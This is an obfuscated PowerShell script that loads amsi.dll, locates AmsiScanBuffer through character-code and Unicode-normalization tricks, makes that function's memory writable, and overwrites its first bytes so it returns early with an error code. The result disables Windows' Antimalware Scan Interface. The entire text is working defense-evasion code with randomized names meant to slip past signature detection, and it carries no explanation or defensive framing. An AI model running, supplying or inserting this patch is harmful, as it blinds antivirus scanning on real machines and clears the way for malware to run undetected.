$J9kj = @"
using System;
using System.Runtime.InteropServices;
public class J9kj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Gg2, string LDPU12ot9qEGSz);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ktLgzKUoW76ylc7Ibkk, UIntPtr c69y9, uint kIzh3y44_0, out uint kXJAqdV2);
}
"@

Add-Type $J9kj

$ue5V = [J9kj]::LoadLibrary("$(('ãmsî.'+'dll').nORmaLize([CHAr]([byTE]0x46)+[ChAR]([bYte]0x6f)+[ChAr](114*55/55)+[chAr](109*2/2)+[cHAr]([BYtE]0x44)) -replace [CHAR]([BYtE]0x5c)+[cHar]([BYte]0x70)+[cHaR](123)+[cHAR]([BYTe]0x4d)+[char]([bYtE]0x6e)+[chAR](125*108/108))")
$kY_W2 = [J9kj]::GetProcAddress($ue5V, "$(('ÂmsíScân'+'Búffèr').NoRMaliZE([ChaR](70*15/15)+[ChaR](111*26/26)+[char]([BYTe]0x72)+[ChAr](109)+[CHar]([bYTE]0x44)) -replace [ChAr](92+1-1)+[Char]([ByTE]0x70)+[ChAr]([byte]0x7b)+[chaR](44+33)+[chAR](110+47-47)+[cHAr](125*78/78))")
$p = 0
[J9kj]::VirtualProtect($kY_W2, [uint32]5, 0x40, [ref]$p)
$aTvcC = "0xB8"
$dZfsGih_S = "0x57"
$kd4bnPemeejkM7 = "0x00"
$VCJEUdXutfdo = "0x07"
$e7YZE64qJHdpdvm4M = "0x80"
$hPmSYN1Pvg_ = "0xC3"
$IDabsIqo56GO0h = [Byte[]] ($aTvcC,$dZfsGih_S,$kd4bnPemeejkM7,$VCJEUdXutfdo,+$e7YZE64qJHdpdvm4M,+$hPmSYN1Pvg_)
[System.Runtime.InteropServices.Marshal]::Copy($IDabsIqo56GO0h, 0, $kY_W2, 6)